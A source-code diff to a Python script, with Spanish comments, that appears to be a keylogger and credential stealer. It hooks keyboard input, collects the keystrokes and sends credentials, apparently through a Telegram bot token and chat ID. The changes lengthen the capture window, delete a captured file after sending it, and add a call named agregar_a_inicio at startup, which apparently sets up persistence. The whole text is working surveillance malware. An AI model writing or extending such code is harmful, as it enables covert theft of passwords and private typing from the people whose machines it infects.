@@ -10,9 +10,8 @@ import pyautogui
 import credentials
 
 ####################################### CREDENCIALES Y GLOBALES
-
-TOKEN = "TOKEN"
-CHAT_ID = "CHAT_ID"
+TOKEN = ""
+CHAT_ID = ""
 
 intervalo_minutos = 10
 capturando = False
@@ -110,7 +109,7 @@ def capturar_teclas():
                 teclas_capturadas.pop()  # Elimina el último carácter
 
     keyboard.on_press(registrar_tecla)
-    time.sleep(60)  # o 900 para 15 min
+    time.sleep(300)  # o 900 para 15 min
     keyboard.unhook_all()
     texto = "".join(teclas_capturadas)
     datos = obtenerDatos()
@@ -125,6 +124,7 @@ def capturar_teclas():
     else:
         print("No se capturó nada, no hay mensaje hasta el siguiente ciclo")
     capturando = False
+    os.remove(file_dst)
 
 def planificador():
     global previous_state
@@ -152,10 +152,9 @@ def enviarCredenciales():
 if __name__ == "__main__":     
     os.system("color 0A")
     print("PROGRAMA INICIADO")
-    
+    agregar_a_inicio()
     enviarCredenciales()
     threading.Thread(target=planificador, daemon=True).start()
-    
     try:
         while True:
             time.sleep(1)
